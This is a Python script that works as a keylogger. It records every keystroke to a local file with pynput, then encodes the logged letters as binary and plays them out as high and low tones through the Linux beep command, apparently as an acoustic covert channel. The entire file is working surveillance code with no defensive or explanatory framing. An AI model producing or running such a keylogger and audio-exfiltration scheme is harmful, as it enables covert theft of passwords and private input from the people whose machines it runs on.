from pynput.keyboard import Key, Listener
import logging
import re
import subprocess
import time

# Function Definitions go under here

# on_press defines what is an event and what to log
def on_press(key):
    logging.info(str(key))

# Converts a decimal input into binary using recursion
def decimal_to_binary(num):
    return decimal_to_binary(num//2)+str(num%2) if num > 1 else str(num)

# Converts ascii data to binary, uses decimal_to_binary
def ascii_to_binary(character):
    ascii = ord(character)
    data = decimal_to_binary(ascii)
    length = 8 -(len(data))
    for i in range(length):
        data = "0" + data
    return data


# Main code starts from here

# Clearing the previous keylog and starting from scratch
open('KeyLog.txt', 'w').close()

logging.basicConfig(filename='KeyLog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
  
# This is the Keylogger functionality that breaks on ctrl+c
while True:
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        break

list_of_binary = []

key_log_file = open('KeyLog.txt', 'r').read()
regex = re.compile(r"^[a-zA-Z]+$")

# This is where we are converting the ascii character to binary and storing them in lob array
for i in key_log_file:
    z = re.match(r"^[a-zA-Z]+$", i)
    if z: # This is the point which will generate a lot of edge cases. Prep for them
        x = ascii_to_binary(i)
        list_of_binary.append(x)

# print(list_of_binary)

# This beeping functionality will only work on a linux system as of now
for element in list_of_binary:
    for i in element:
        # print(type(i))
        if i == '1':
            # print("Here")
            subprocess.call('beep -f 7000 -l 50 -r 2', shell=True)
            time.sleep(3)
            # print(i)
        elif i == '0':
            # print("There")
            subprocess.call('beep -f 4000 -l 50 -r 1', shell=True)
            time.sleep(3)